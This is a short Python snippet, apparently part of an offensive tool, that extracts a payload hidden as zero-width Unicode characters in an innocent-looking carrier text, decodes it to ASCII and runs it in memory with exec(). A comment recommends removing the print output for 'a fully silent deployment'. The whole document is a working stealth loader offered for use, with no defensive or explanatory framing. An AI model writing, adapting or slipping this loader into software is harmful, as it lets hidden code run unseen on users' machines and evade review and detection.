# Constants must be included in the module so the function can access them
ZERO_CHAR = '\u200B' # treated as binary 0
ONE_CHAR = '\u200C' # treated as binary 1

def decode_and_execute(weaponized_text: str):
    """Extracts zero-width payload, decodes it, and executes in memory."""
    # 1. Filter out standard visible characters (the carrier)
    hidden_data = [char for char in weaponized_text if char in (ZERO_CHAR, ONE_CHAR)]
    
    if not hidden_data:
        print("No hidden payload found.")
        return
        
    # 2. Reconstruct the binary stream
    binary_stream = ''.join('1' if char == ONE_CHAR else '0' for char in hidden_data)
    
    # 3. Chunk into bytes and convert back to ASCII
    chars = []
    for i in range(0, len(binary_stream), 8):
        byte = binary_stream[i:i+8]
        chars.append(chr(int(byte, 2)))
        
    extracted_payload = ''.join(chars)
    
    # 4. In-memory execution
    # Note: In a fully silent deployment, you would remove the print statements
    exec(extracted_payload)
